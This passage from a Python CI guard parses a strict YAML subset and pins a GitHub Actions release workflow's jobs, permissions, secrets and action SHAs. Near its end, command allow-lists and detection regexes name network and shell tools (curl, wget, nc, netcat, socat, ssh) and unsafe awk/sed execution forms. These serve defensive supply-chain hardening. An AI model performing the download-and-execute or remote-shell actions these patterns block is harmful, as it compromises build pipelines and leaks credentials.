    first = next((i for i in range(n) if i >= len(got) or i >= len(want) or got[i] != want[i]), 0)
    have = got[first] if first < len(got) else "<end of unit>"
    exp = want[first] if first < len(want) else "<end of unit>"
    return f"statement {first + 1} is `{have[:90]}`, the only allowed one is `{exp[:90]}`"


# ------------------------------------------------------------------ report --
class Report:
    def __init__(self) -> None:
        self.errors: List[str] = []
        self.root: Optional[Path] = None  # the tree being checked (local actions are read from it)
        self.walked: set = set()  # resolved local-action directories already walked (Round 6, R4-3)
        self.heights: Dict[Path, int] = {}  # Round 7 (N6): the height of the chain below each walked local action

    def bad(self, msg: str) -> None:
        self.errors.append(msg)

    def first(self) -> str:
        return self.errors[0] if self.errors else ""


class InputError(Exception):
    """An input file could not be read or decoded: exit 2, never a traceback."""


def load(path: Path, label: str, rep: Report, strict: bool) -> Optional[str]:
    """Read one input. Missing = a guard failure (None). Anything else that stops
    a read (non-UTF-8, a directory, a symlink loop, no permission) = InputError,
    exit 2. ``strict`` refuses control characters and non-ASCII spaces."""
    try:
        text = path.read_bytes().decode("utf-8")  # bytes: text mode would fold CR away
    except FileNotFoundError:
        rep.bad(f"{label} is missing")
        return None
    except (OSError, ValueError) as exc:
        raise InputError(f"cannot read {label}: {exc}") from exc
    if strict:
        m = CONTROL_RE.search(text)
        if m:
            line = text.count("\n", 0, m.start()) + 1
            rep.bad(f"{label}: line {line}: control character or non-ASCII space U+{ord(m.group(0)):04X} "
                    "(Python, YAML and bash disagree on line ends and blanks; refused, never folded)")
            return None
    return text


# --------------------------------------------------------- YAML subset ----
class YamlError(Exception):
    """A line outside the subset grammar."""


class Node:
    """One node of the subset grammar. ``kind`` is map | seq | scalar | block |
    null; ``value`` is a dict (map), a list of nodes (seq), the text (scalar)
    or the content lines (block); ``style`` is the scalar style or the block
    indicator; ``line`` is the 0-based source line."""

    def __init__(self, kind: str, line: int, value: object, style: str = "") -> None:
        self.kind = kind
        self.line = line
        self.value = value
        self.style = style

    def get(self, key: str) -> Optional["Node"]:
        if self.kind != "map" or not isinstance(self.value, dict):
            return None
        return self.value.get(key)

    def keys(self) -> List[str]:
        return list(self.value) if self.kind == "map" and isinstance(self.value, dict) else []

    def text(self) -> str:
        return self.value if self.kind == "scalar" and isinstance(self.value, str) else ""


class YamlSubset:
    """Strict line parser; ``bad`` raises, so the first unexplained line stops
    the parse. (Each refusal is followed by a fallback that only a mutant with
    ``bad`` neutralised reaches: it lets ``--mutation-sweep`` prove the case.)"""

    def __init__(self, text: str, label: str) -> None:
        self.lines = text.split("\n")
        self.label = label
        self.i = 0

    def bad(self, n: int, msg: str) -> None:
        raise YamlError(f"{self.label}: line {n + 1}: {msg}")

    def peek(self) -> Optional[int]:
        j = self.i
        while j < len(self.lines) and is_blank_or_comment(self.lines[j]):
            j += 1
        return j if j < len(self.lines) else None

    def parse(self) -> Node:
        for n, ln in enumerate(self.lines):
            if "\t" in ln:
                self.bad(n, "tab character (refused everywhere: YAML forbids it in indentation and bash reads it as a blank)")
        return self.parse_map(0)

    def parse_map(self, ind: int) -> Node:
        node = Node("map", self.i, {})
        mapping: Dict[str, Node] = {}
        node.value = mapping
        while True:
            j = self.peek()
            if j is None:
                break
            line = self.lines[j]
            li = indent_of(line)
            if li < ind:
                break
            if li > ind:
                self.bad(j, f"line is more indented than its mapping (indent {li}, mapping keys at {ind}: a multi-line "
                            f"scalar or a stray key): {line.strip(' ')[:60]}")
                self.i = j + 1
                continue
            m = KEY_RE.fullmatch(line[li:])
            if m is None:
                self.bad(j, f"line outside the subset grammar (quoted or complex key, flow mapping, document marker...): "
                            f"{line.strip(' ')[:60]}")
                self.i = j + 1
                continue
            key = m.group("key")
            self.i = j + 1
            child = self.parse_value(j, ind, m.group("val") or "")
            if key in mapping:
                self.bad(j, f"duplicate key `{key}:`")
                continue
            mapping[key] = child
        return node

    def parse_value(self, j: int, ind: int, val: str) -> Node:
        if val.startswith("#"):
            val = ""
        if val == "":
            k = self.peek()
            if k is not None and indent_of(self.lines[k]) > ind:
                ci = indent_of(self.lines[k])
                if self.lines[k][ci:].startswith("-"):
                    return self.parse_seq(ci)
                return self.parse_map(ci)
            return Node("null", j, None)
        if val in BLOCK_INDICATORS:
            return self.parse_block(j, ind, val)
        return self.scalar(j, val)

    def scalar(self, j: int, val: str) -> Node:
        for style, rx in SCALAR_FORMS:
            m = rx.fullmatch(val)
            if m is not None:
                v = m.group("v")
                if style == "double" and "\\" in v:
                    self.bad(j, "a backslash inside a double-quoted scalar (YAML decodes escapes such as \\x63 or \\u0063 "
                                f"that the guard would read raw; refused, never decoded): {val[:60]}")
                if style == "single":
                    return Node("scalar", j, v[1:-1].replace("''", "'"), style)
                return Node("scalar", j, v if style == "plain" else v[1:-1], style)
        self.bad(j, f"value outside the subset grammar (multi-line or unterminated quote, anchor, alias, tag, flow "
                    f"mapping, block indentation indicator, `: ` in a plain value...): {val[:60]}")
        return Node("scalar", j, val, "plain")

    def parse_block(self, j: int, ind: int, indicator: str) -> Node:
        content: List[str] = []
        cind = -1
        k = j + 1
        while k < len(self.lines):
            raw = self.lines[k]
            if not raw.strip(" "):
                content.append("")
                k += 1
                continue
            ri = indent_of(raw)
            if ri <= ind:
                break
            if cind < 0:
                cind = ri
            if ri < cind:
                self.bad(k, f"block scalar line less indented ({ri}) than its first line ({cind})")
                content.append(raw.strip(" "))
                k += 1
                continue
            content.append(raw[cind:])
            k += 1
        self.i = k
        while content and content[-1] == "":
            content.pop()
        return Node("block", j, content, indicator)

    def parse_seq(self, s: int) -> Node:
        items: List[Node] = []
        node = Node("seq", self.i, items)
        while True:
            j = self.peek()
            if j is None:
                break
            line = self.lines[j]
            li = indent_of(line)
            if li < s:
                break
            if li > s:
                self.bad(j, f"line is more indented than its sequence (indent {li}, items at {s}): {line.strip(' ')[:60]}")
                self.i = j + 1
                continue
            m = ITEM_RE.fullmatch(line[li:])
            if m is None or m.group("sp") != " " or not m.group("rest"):
                self.bad(j, f"sequence line outside the subset grammar (`- ` takes exactly one space and a value on "
                            f"the same line): {line.strip(' ')[:60]}")
                if m is None:
                    self.i = j + 1
                    continue
            rest = m.group("rest").lstrip(" ")
            if KEY_RE.fullmatch(rest):
                self.lines[j] = " " * (s + 2) + rest
                self.i = j
                items.append(self.parse_map(s + 2))
            else:
                self.i = j + 1
                items.append(self.scalar(j, rest) if rest else Node("null", j, None))
        return node


def parse_yaml(text: str, label: str, rep: Report) -> Optional[Node]:
    try:
        return YamlSubset(text, label).parse()
    except YamlError as exc:
        rep.bad(str(exc))
        return None


def walk(node: Node, path: Tuple[str, ...] = ()) -> Iterator[Tuple[Tuple[str, ...], Node]]:
    yield path, node
    if node.kind == "map" and isinstance(node.value, dict):
        for k, v in node.value.items():
            yield from walk(v, path + (k,))
    elif node.kind == "seq" and isinstance(node.value, list):
        for n, v in enumerate(node.value):
            yield from walk(v, path + (str(n),))


def check_blocks(doc: Node, label: str, rep: Report) -> None:
    """A block scalar is allowed only as a step ``run:`` or a step ``with:`` value."""
    for path, node in walk(doc):
        if node.kind != "block":
            continue
        in_step = len(path) >= 5 and path[0] == "jobs" and path[2] == "steps"
        if in_step and ((len(path) == 5 and path[4] == "run") or (len(path) == 6 and path[4] == "with")):
            continue
        rep.bad(f"{label}: line {node.line + 1}: a block scalar (`|`/`>`) at `{'.'.join(path)}`; only a step `run:` "
                "or a step `with:` value may be one")


def want_kind(node: Optional[Node], kind: str, what: str, rep: Report) -> bool:
    if node is not None and node.kind == kind:
        return True
    rep.bad(f"{what} must be a {'mapping' if kind == 'map' else 'sequence' if kind == 'seq' else kind}"
            f" (got {'nothing' if node is None else node.kind})")
    return False


def node_texts(node: Node) -> Iterator[str]:
    """Every executable-looking text under ``node`` (scalars, and the logical
    lines of block scalars), skipping ``name:`` values."""
    for path, sub in walk(node):
        if path and path[-1] == "name":
            continue
        if sub.kind == "scalar":
            yield sub.text()
        elif sub.kind == "block" and isinstance(sub.value, list):
            yield from logical_lines(sub.value)


# ------------------------------------------------------------ step units --
def step_label(i: int, step: Node) -> str:
    name = step.get("name") or step.get("uses")
    return f"step {i + 1} `{name.text()[:60] if name is not None else '?'}`"


def run_lines(step: Node) -> Tuple[str, ...]:
    run = step.get("run")
    if run is None:
        return ()
    if run.kind == "block" and isinstance(run.value, list):
        return tuple(logical_lines(run.value))
    return tuple(logical_lines([run.text()]))


Norm = Callable[[Tuple[str, ...]], Tuple[str, ...]]


def _same(lines: Tuple[str, ...]) -> Tuple[str, ...]:
    return lines


def step_problem(step: Node, want_keys: Tuple[str, ...], expected: Tuple[str, ...], norm: Norm = _same) -> str:
    """Why ``step`` is not the allowed unit ("" when it is exactly that unit)."""
    why = Report()
    if set(step.keys()) != set(want_keys):
        why.bad(f"step keys {sorted(step.keys())} differ from the only allowed set {sorted(want_keys)}")
    name = step.get("name")
    if name is not None and "${{" in name.text():
        why.bad("the step `name:` carries a `${{ }}` expression (refused in a pinned unit)")
    run = step.get("run")
    if run is None or run.kind != "block" or run.style != "|":
        why.bad("`run:` must be a literal block (`run: |`); a folded, quoted or inline run is refused")
    shell = step.get("shell")
    if "shell" in want_keys and (shell is None or shell.style != "plain" or shell.text() != "bash"):
        why.bad(f"`shell: {shell.text() if shell is not None else ''}` (only an unquoted `shell: bash` is allowed)")
    got = norm(run_lines(step))
    if got != expected:
        why.bad(first_diff(got, expected))
    return why.first()


def job_steps(job: Node, where: str, rep: Report) -> List[Tuple[int, Node]]:
    steps = job.get("steps")
    if steps is None or steps.kind != "seq" or not isinstance(steps.value, list):
        return []
    return [(i, st) for i, st in enumerate(steps.value) if want_kind(st, "map", f"{where} step {i + 1}", rep)]


def canonical(steps: List[Tuple[int, Node]], want_keys: Tuple[str, ...], expected: Tuple[str, ...],
              norm: Norm = _same) -> List[int]:
    return [i for i, st in steps if not step_problem(st, want_keys, expected, norm)]


def nearest_problem(steps: List[Tuple[int, Node]], want_keys: Tuple[str, ...], expected: Tuple[str, ...],
                    norm: Norm = _same) -> str:
    """The step that shares the most statements with the unit, and why it is not it."""
    best: Optional[Tuple[int, Node]] = None
    score = 0
    for i, st in steps:
        s = len(set(norm(run_lines(st))) & set(expected))
        if s > score:
            best, score = (i, st), s
    if best is None:
        return "no step shares a statement with it"
    return f"nearest is {step_label(*best)}: {step_problem(best[1], want_keys, expected, norm)}"


def one_unit(steps: List[Tuple[int, Node]], want_keys: Tuple[str, ...], expected: Tuple[str, ...], what: str,
             rep: Report, const: str, norm: Norm = _same) -> List[int]:
    found = canonical(steps, want_keys, expected, norm)
    if len(found) != 1:
        rep.bad(f"{what} must have exactly one step with exactly the allowed body (found {len(found)})"
                + (": " + nearest_problem(steps, want_keys, expected, norm) if not found else "") + pin_hint(const))
    return found


# ------------------------------------------------------------------ checks --
def check_no_bash_env(label: str, text: str, rep: Report) -> None:
    if "BASH_ENV" in text:
        rep.bad(f"{label}: BASH_ENV runs a file before every non-interactive bash, so it can neutralise the assert (refused anywhere)")


def unquoted(text: str) -> str:
    """``text`` as bash reads a word: quote and backslash characters removed
    (``c''argo`` and ``ca\\rgo`` read as ``cargo``). A best-effort spelling view
    for REFUSALS only; it cannot see a name built by expansion."""
    return QUOTE_RE.sub("", text)


def check_text_counts(text: str, rep: Report) -> None:
    """Whole-file backstops (any job): at most one line builds the matrix target,
    at most one runs ``cargo ... cyclonedx``."""
    lines = logical_lines(text.split("\n"))
    builds = [ln for ln in lines if BUILD_TOOL_RE.search(unquoted(ln)) and "matrix.target" in ln]
    if len(builds) > 1:
        rep.bad(f"release.yml: {len(builds)} lines run a build tool against the matrix target; only the allowed unit "
                f"may build: {builds[-1][:90]}")
    sboms = [ln for ln in lines if SBOM_TOOL_RE.search(unquoted(ln))]
    if len(sboms) > 1:
        rep.bad(f"release.yml: {len(sboms)} lines run `cargo ... cyclonedx`; only the SBOM unit in the `sbom:` job may: "
                f"{sboms[-1][:90]}")


def check_matrix(job: Node, rep: Report) -> None:
    st = job.get("strategy")
    matrix = st.get("matrix") if st is not None else None
    include = matrix.get("include") if matrix is not None else None
    if (st is None or set(st.keys()) != {"fail-fast", "matrix"} or st.get("fail-fast") is None
            or st.get("fail-fast").text() != "false" or matrix is None or matrix.keys() != ["include"]
            or include is None or include.kind != "seq"):
        rep.bad("release.yml release job `strategy:` must be exactly `fail-fast: false` plus `matrix:` with only "
                "`include:` entries (no other axis, no `exclude:`, no expression; the shape is fixed in check_matrix in "
                f"{GUARD_PATH})")
        return
    targets: List[str] = []
    for n, entry in enumerate(include.value if isinstance(include.value, list) else []):
        keys = set(entry.keys())
        if entry.kind != "map" or not set(MATRIX_REQUIRED) <= keys <= set(MATRIX_VALUE_RE):
            rep.bad(f"release.yml release matrix entry {n + 1}: keys {sorted(keys)}; the allowed keys are "
                    f"{list(MATRIX_REQUIRED)} plus optionally `nfpm_arch`" + pin_hint("MATRIX_REQUIRED"))
        for key in sorted(keys):
            val = entry.get(key)
            rx = MATRIX_VALUE_RE.get(key)
            if rx is not None and (val is None or val.style != "plain" or not rx.fullmatch(val.text())):
                rep.bad(f"release.yml release matrix entry {n + 1}: `{key}:` must be an unquoted literal matching "
                        f"`{rx.pattern}` (it is substituted into the pinned build and assert text before bash runs: "
                        "no expression, quote, space or shell metacharacter)" + pin_hint("MATRIX_VALUE_RE"))
        tv = entry.get("target")
        targets.append(tv.text() if tv is not None else "")
    if sorted(targets) != sorted(RELEASE_TARGETS):
        rep.bad(f"release.yml release matrix targets {sorted(targets)} differ from the pinned set "
                f"{sorted(RELEASE_TARGETS)}" + pin_hint("RELEASE_TARGETS"))


def check_release_job(job: Node, rep: Report) -> None:
    if set(job.keys()) != set(JOB_KEYS):
        rep.bad(f"release.yml release job keys {job.keys()} differ from the pinned skeleton {list(JOB_KEYS)} (a job "
                "`if:`, `env:`, `defaults:`, `container:` or `continue-on-error:` can skip or neutralise the assert)"
                + pin_hint("JOB_KEYS"))
    ro = job.get("runs-on")
    if ro is None or ro.style != "plain" or ro.text() != RELEASE_RUNS_ON:
        rep.bad(f"release.yml release job `runs-on:` must be exactly `{RELEASE_RUNS_ON}`" + pin_hint("RELEASE_RUNS_ON"))
    check_matrix(job, rep)
    steps = job_steps(job, "release.yml release job", rep)
    builds = one_unit(steps, KEYS_SHELL, WF_BUILD, "release.yml: the release job build", rep, "WF_BUILD")
    asserts = one_unit(steps, KEYS_SHELL, WF_ASSERT, "release.yml: the release job strict assert", rep, "WF_ASSERT")
    if builds and asserts and min(asserts) < max(builds):
        rep.bad("release.yml: the strict assert must run after the build, in the same job")
    for i, st in steps:
        if i in builds:
            continue
        hit = next((m for m in (BUILD_TOOL_RE.search(unquoted(t)) for t in node_texts(st)) if m), None)
        if hit is not None:
            rep.bad(f"release.yml: release job {step_label(i, st)} runs `{hit.group(0)}`; only the canonical build "
                    "step may run a build tool in the release job (any option order or +toolchain)")


def check_sbom_job(job: Node, rep: Report) -> None:
    if set(job.keys()) != set(SBOM_JOB_KEYS):
        rep.bad(f"release.yml sbom job keys {job.keys()} differ from the pinned skeleton {list(SBOM_JOB_KEYS)}"
                + pin_hint("SBOM_JOB_KEYS"))
    one_unit(job_steps(job, "release.yml sbom job", rep), KEYS_PLAIN, WF_SBOM, "release.yml: the `sbom:` job SBOM", rep, "WF_SBOM")


def pin_problem(node: Optional[Node], spec: Spec, path: str) -> str:
    """Why ``node`` is not exactly the pinned ``spec`` ("" when it is). A mapping
    must have exactly the pinned keys, a sequence exactly the pinned items."""
    if node is None:
        return f"`{path}` is missing"
    if isinstance(spec, dict):
        if node.kind != "map":
            return f"`{path}` must be a mapping (got {node.kind})"
        if set(node.keys()) != set(spec):
            extra, lost = sorted(set(node.keys()) - set(spec)), sorted(set(spec) - set(node.keys()))
            return f"`{path}` keys differ from the pinned set (extra {extra}, missing {lost})"
        for key, sub in spec.items():
            why = pin_problem(node.get(key), sub, f"{path}.{key}")
            if why:
                return why
        return ""
    if isinstance(spec, list):
        items = node.value if node.kind == "seq" and isinstance(node.value, list) else None
        if items is None or len(items) != len(spec):
            return f"`{path}` must be a sequence of exactly {len(spec)} items (got {node.kind}" + (
                f" of {len(items)})" if items is not None else ")")
        for n, (item, sub) in enumerate(zip(items, spec)):
            why = pin_problem(item, sub, f"{path}.{n + 1}")
            if why:
                return why
        return ""
    if spec is None:
        return "" if node.kind == "null" else f"`{path}` must have no value (got {node.kind})"
    if isinstance(spec, Block):
        if node.kind == "block" and node.style == "|" and tuple(node.value) == tuple(spec):  # type: ignore[arg-type]
            return ""
        return f"`{path}` must be exactly the `|` block {list(spec)}"
    style = "flow" if isinstance(spec, Flow) else "double" if isinstance(spec, Double) else "plain"
    if node.kind == "scalar" and node.style == style and node.text() == spec:
        return ""
    got = node.text() if node.kind == "scalar" else ""
    return f"`{path}` must be exactly the {style} value `{spec}` (got {node.kind} {node.style or ''} `{got[:60]}`)"


def pin_hint(const: str) -> str:
    """The actionable tail of every pin-mismatch message."""
    return f"; if this change is intended, update {const} in {GUARD_PATH} in the same commit"


def pin_message(label: str, why: str, const: str) -> str:
    return f"{label}: {why}{pin_hint(const)}"


def docker_step_message(step: Node, spec: Spec, n: int) -> str:
    """The one message for docker job step ``n`` ("" when it is the pinned step).
    A changed SHA of a pinned action (a Dependabot bump) names its constant; the
    rest of the step is then compared as if the new SHA were pinned."""
    at = f"jobs.docker.steps.{n + 1}"
    role = f"release.yml ({DOCKER_STEP_ROLES[n]} step)"
    uses = step.get("uses") if step.kind == "map" else None
    want = spec.get("uses") if isinstance(spec, dict) else None
    if (isinstance(want, str) and uses is not None and uses.kind == "scalar" and uses.style == "plain"
            and uses.text() != want and uses.text().split("@")[0] == want.split("@")[0]):
        const = USES_CONSTANTS[want]
        rest = dict(spec)  # type: ignore[arg-type]
        rest["uses"] = uses.text()
        why = pin_problem(step, rest, at)
        return (f"{role}: `{at}.uses` is `{uses.text()}` but {const} pins `{want}` (an action SHA bump, e.g. "
                f"Dependabot): update {const} in {GUARD_PATH} to the new SHA in the same commit"
                + (f"; also {why}" if why else ""))
    why = pin_problem(step, spec, at)
    return pin_message(role, why, "DOCKER_STEPS") if why else ""


def check_docker_job(jobs: Node, rep: Report) -> None:
    """The docker job holds `packages: write`, so it is pinned WHOLE: its keys and
    values (DOCKER_JOB) and its exact ordered steps (DOCKER_STEPS: keys, SHA-pinned
    `uses`, `with:` inputs, run text). No `env:`, `container:`, `defaults:`,
    `services:`, `strategy:` or extra step can be added."""
    job = jobs.get("docker")
    if job is None or job.kind != "map":
        rep.bad("release.yml: the `docker:` job is missing or not a mapping (the GHCR image is built and pushed only by "
                "the pinned `docker:` job)")
        return
    want_keys = set(DOCKER_JOB) | {"steps"}
    if set(job.keys()) != want_keys:
        extra, lost = sorted(set(job.keys()) - want_keys), sorted(want_keys - set(job.keys()))
        rep.bad(pin_message("release.yml", f"`jobs.docker` keys differ from the pinned set (extra {extra}, missing "
                            f"{lost}; a job `env:`, `container:`, `defaults:`, `services:` or `strategy:` changes what is "
                            "built or pushed)", "DOCKER_JOB"))
    for key, spec in DOCKER_JOB.items():
        why = pin_problem(job.get(key), spec, f"jobs.docker.{key}")
        if why:
            rep.bad(pin_message("release.yml", why, "DOCKER_JOB"))
    steps = job.get("steps")
    items = steps.value if steps is not None and steps.kind == "seq" and isinstance(steps.value, list) else None
    if items is None:
        rep.bad(pin_message("release.yml", "`jobs.docker.steps` must be a sequence", "DOCKER_STEPS"))
        return
    if len(items) != len(DOCKER_STEPS):
        first = next((n for n in range(max(len(items), len(DOCKER_STEPS)))
                      if n >= len(items) or n >= len(DOCKER_STEPS) or docker_step_message(items[n], DOCKER_STEPS[n], n)),
                     0)
        rep.bad(pin_message("release.yml", f"the docker job has {len(items)} steps, the pinned list has "
                            f"{len(DOCKER_STEPS)} (an extra step can build or push an image the guard never read); the "
                            f"first difference is step {first + 1}", "DOCKER_STEPS"))
        return
    for n, (step, spec) in enumerate(zip(items, DOCKER_STEPS)):
        msg = docker_step_message(step, spec, n)
        if msg:
            rep.bad(msg)


def check_job_needs(name: str, job: Node, rep: Report) -> None:
    """#6289: the job's `needs:` is exactly RELEASE_JOB_NEEDS[name]; the root job has none."""
    needs = RELEASE_JOB_NEEDS.get(name)
    if needs is None:
        if job.get("needs") is not None:
            rep.bad(pin_message("release.yml", f"`jobs.{name}` carries a `needs:` and is pinned to have none (#6289)",
                                "RELEASE_JOB_NEEDS"))
        return
    why = pin_problem(job.get("needs"), needs, f"jobs.{name}.needs")
    if why:
        rep.bad(pin_message("release.yml", why + " (a dropped edge lets the job run before its gate, #6289)",
                            "RELEASE_JOB_NEEDS"))


def check_release_permissions(doc: Node, jobs: Node, rep: Report) -> None:
    """The job set and every job's `permissions:` are pinned; `packages: write`
    is the docker job's alone (#4719 SR-8)."""
    why = pin_problem(doc.get("permissions"), RELEASE_TOP_PERMISSIONS, "permissions")
    if why:
        rep.bad(pin_message("release.yml", why + " (`packages: write` belongs to the docker job only)",
                            "RELEASE_TOP_PERMISSIONS"))
    if set(jobs.keys()) != set(RELEASE_JOBS):
        extra, lost = sorted(set(jobs.keys()) - set(RELEASE_JOBS)), sorted(set(RELEASE_JOBS) - set(jobs.keys()))
        rep.bad(pin_message("release.yml", f"the job set differs from the pinned one (extra {extra}, missing {lost})",
                            "RELEASE_JOB_PERMISSIONS"))
    for name, want in RELEASE_JOB_PERMISSIONS.items():
        job = jobs.get(name)
        if job is None or job.kind != "map":
            continue
        if job.get("uses") is not None:
            rep.bad(f"release.yml: `jobs.{name}` calls a reusable workflow (`uses:`), which the guard cannot read")
        check_job_needs(name, job, rep)
        perms = job.get("permissions")
        if want is None:
            if perms is not None:
                rep.bad(pin_message("release.yml", f"`jobs.{name}.permissions` is declared; the pinned job inherits the "
                                    "top-level `contents: write` and declares none", "RELEASE_JOB_PERMISSIONS"))
            continue
        why = pin_problem(perms, want, f"jobs.{name}.permissions")
        if why:
            rep.bad(pin_message("release.yml", why, "RELEASE_JOB_PERMISSIONS"))


def node_lines(node: Node) -> Iterator[Tuple[int, str]]:
    """(0-based line, text) of a scalar, or of each line of a block scalar."""
    if node.kind == "scalar":
        yield node.line, node.text()
    elif node.kind == "block" and isinstance(node.value, list):
        for k, line in enumerate(node.value):
            yield node.line + 1 + k, line


def check_secrets_and_registry(doc: Node, rep: Report) -> None:
    """Every `secrets` reference is `secrets.<NAME>` with NAME in RELEASE_SECRETS,
    no key is named `secrets`, and the image registry is named only inside the
    pinned docker job."""
    for path, node in walk(doc):
        if path and path[-1].lower() == "secrets":
            rep.bad(f"release.yml: `{'.'.join(path)}` passes secrets on (a `secrets:` key is refused)")
        in_docker = path[:2] == ("jobs", "docker")
        for line, text in node_lines(node):
            for m in SECRET_REF_RE.finditer(text):
                if m.group("name") not in RELEASE_SECRETS or m.group(0) != "secrets." + str(m.group("name")):
                    rep.bad(pin_message("release.yml", f"line {line + 1}: `{m.group(0)[:40]}` is not `secrets.<NAME>` "
                                        "with a pinned NAME (a new credential is refused until it is pinned)",
                                        "RELEASE_SECRETS"))
            if not in_docker and REGISTRY in text.lower():
                rep.bad(f"release.yml: line {line + 1}: `{REGISTRY}` outside the pinned `docker:` job (only that job may "
                        f"address the image registry): {text.strip()[:70]}")


def check_run_continuations(doc: Node, label: str, rep: Report) -> None:
    """No run text line may end in a backslash: every pinned unit is compared statement by
    statement, and a joined line is a second spelling the guard refuses to model."""
    for path, node in walk(doc):
        if not path or path[-1] != "run":
            continue
        for line, text in node_lines(node):
            if text.rstrip(" \t").endswith("\\"):
                rep.bad(f"{label}: line {line + 1}: a run line ends in `\\` (a line continuation; join the line, the "
                        f"guard refuses continuations in run text): {text.strip()[:70]}")


# #6904: a `uses:` names an action by a full 40-hex commit sha (a tag, a branch
# or a short ref can be re-pointed); a local `./` action and a docker image by
# sha256 digest are the only other forms.
USES_PINNED_RE = re.compile(r"\./[A-Za-z0-9_./-]+|docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]{64}"
                            r"|[A-Za-z0-9][A-Za-z0-9_.-]*/[A-Za-z0-9_./-]+@[0-9a-f]{40}")


# Round 5 (F2): a container or service image is pinned by digest, as a `docker://` use is.
IMAGE_DIGEST_RE = re.compile(r"[a-z0-9][a-z0-9._/:-]*@sha256:[0-9a-f]{64}")
DOCKER_USES_RE = re.compile(r"docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]{64}")
# Round 5 (F4): a `run:` never downloads and executes, and never splices an attacker-influenced
# expression into the script text (it belongs in `env:` and is quoted in the script).
EXPR_RE = re.compile(r"\$\{\{(.*?)\}\}", re.S)
# Round 6 (3-agent vote 6def5ab6, option B, 3-0): the denylist regexes of round 5 are gone (two rounds of
# splice and download-execute forms slipped past them). A `${{ }}` expression in `run:` text is allowed only as
# a bare `matrix.<key>`, `secrets.<NAME>` or `steps.<id>.outputs.<name>` path, and a step that fetches may run
# only the commands of FETCH_ALLOWED; everything else is refused, so a new form fails closed.
EXPR_PATH_RE = re.compile(r"[A-Za-z_][A-Za-z0-9_-]*(?:\.[A-Za-z_][A-Za-z0-9_-]*)*")
SHA_USES_RE = re.compile(r"[^@\s]+@[0-9a-f]{40}")
TAINT_ENV_RE = re.compile(r"\$\{?GITHUB_(?:HEAD_REF|REF_NAME|REF|BASE_REF|EVENT_PATH|ACTOR|TRIGGERING_ACTOR)(?![A-Za-z0-9_])")
# Case-folded and matched anywhere in a word (also inside `sh -c '...'`): a false positive only makes a step
# subject to the allow-list, never exempt from it.
FETCH_WORD_RE = re.compile(
    r"(?<![\w.-])(?:curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm|Start-BitsTransfer|DownloadFile|git\s+clone|"
    r"urllib\w*|http\.client|httplib|requests|aria2c|axel|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|ftp)(?![\w-])", re.I)
URL_RE = re.compile(r"[A-Za-z][A-Za-z0-9+.-]*://")
# `docker run` options that take a value, so the image is the first token that is not an option or a value.
DOCKER_VALUE_OPTS = frozenset((
    "-e", "--env", "-v", "--volume", "-p", "--publish", "--name", "--network", "--net", "-w", "--workdir", "-u", "--user",
    "--entrypoint", "--env-file", "-l", "--label", "--platform", "--restart", "-h", "--hostname", "--add-host", "--mount",
    "--cap-add", "--cap-drop", "--device", "--dns", "--memory", "-m", "--cpus", "--pull", "--log-driver", "--security-opt",
    "--tmpfs", "--ulimit", "--shm-size", "--health-cmd", "--group-add", "--ip", "--cgroup-parent", "--stop-signal"))
# Round 8 (C4): `docker run` options that take no value. An option in neither set is refused, because an unknown valued
# option would make the guard read its value as the image.
DOCKER_FLAG_OPTS = frozenset((
    "-d", "--detach", "-i", "--interactive", "-t", "--tty", "-it", "-dit", "-di", "--rm", "--init", "--privileged",
    "--read-only", "-P", "--publish-all", "--no-healthcheck", "--sig-proxy=false", "-q", "--quiet"))
# Round 8 (S8, 3-agent vote 6def5ab6 extended to every `run:`): the command words a `run:` text may use. A word that
# is not here (and is not a function the text defines) is a problem, so a downloader (pip, npm, go, aria2c, nc, ...) is
# refused by not being listed and no pattern has to name it. The tuple is sorted (a test pins that). A tool that can
# fetch or run code is further held to its own policy in command_problem.
RUN_ALLOWED = (
    "[", "[[", "apt-get", "awk", "bash", "cargo", "cat", "cbindgen", "cd", "chmod", "chown", "command", "copr-cli", "cp",
    "curl", "cut", "declare", "docker", "echo", "export", "gh", "git", "grep", "head", "lipo", "ls", "mkdir", "mv", "nfpm",
    "openssl", "pipx", "printf", "python3", "rm", "rpm", "rpmbuild", "sed", "seq", "sha256sum", "shasum", "sleep", "source",
    "sudo", "tail", "tar", "test", "timeout", "tr", "unzip", "wget", "xargs", "xcodebuild")
RUN_WRAPPERS = ("command", "sudo", "timeout", "xargs")  # run the command that follows; that command is held to the list
RUN_GIT = ("add", "branch", "checkout", "commit", "config", "diff", "fetch", "log", "merge-base", "push", "rev-list",
           "rev-parse", "show", "status", "tag")
RUN_CARGO = ("build", "check", "clippy", "cyclonedx", "doc", "fetch", "fmt", "install", "metadata", "package", "publish",
             "test", "tree")
RUN_CARGO_CRATES = ("cargo-cyclonedx", "cbindgen")  # `cargo install` of these two, with --locked and a pinned --version
RUN_DOCKER = ("exec", "inspect", "kill", "logs", "ps", "rm", "stop")  # run, create and pull need a digest or a local image
RUN_OPENSSL = ("dgst", "ecparam", "genpkey", "genrsa", "pkey", "rand", "req", "verify", "version", "x509")
RUN_PIPX = frozenset((("ensurepath",), ("install", "copr-cli"), ("inject", "copr-cli", "rich")))
RUN_APT_PKGS = ("pipx", "rpm")
RUN_URL_TOOLS = ("cargo", "copr-cli", "docker", "git", "nfpm", "pipx", "rpm", "rpmbuild")  # given a URL, they fetch it
RUN_SCRIPT_RE = re.compile(r"[A-Za-z0-9_][A-Za-z0-9_./-]*")
RUN_PY_RE = re.compile(r"[A-Za-z0-9_][A-Za-z0-9_./-]*\.py")
RUN_SH_FLAGS_RE = re.compile(r"[-+][euxBE]+")
RUN_PY_FLAGS_RE = re.compile(r"-[IuBsSE]+")
RUN_DURATION_RE = re.compile(r"[0-9]+[smhd]?")
AWK_UNSAFE_RE = re.compile(r"system\s*\(|getline|\|\s*[\"&]|[\"]\s*\||@load|@include")
SED_UNSAFE_RE = re.compile(r"(?:^|[;{\n])\s*e(?:\s|$)|/[gIpm0-9]*e[gIpm0-9]*(?:$|[;}\n])")
FETCH_ALLOWED = ("curl", "wget", "sha256sum", "shasum", "tar", "unzip", "mkdir", "mv", "cp", "cd", "echo", "test", "[",
                 "ls", "chmod")
FETCH_FILE_RE = re.compile(r"GITHUB_(?:ENV|PATH)(?![A-Za-z0-9_])")  # a fetch step never edits the next steps' env or PATH
# Round 7 (F3): a command that consumes a fetched file needs a checksum check first; these check one.
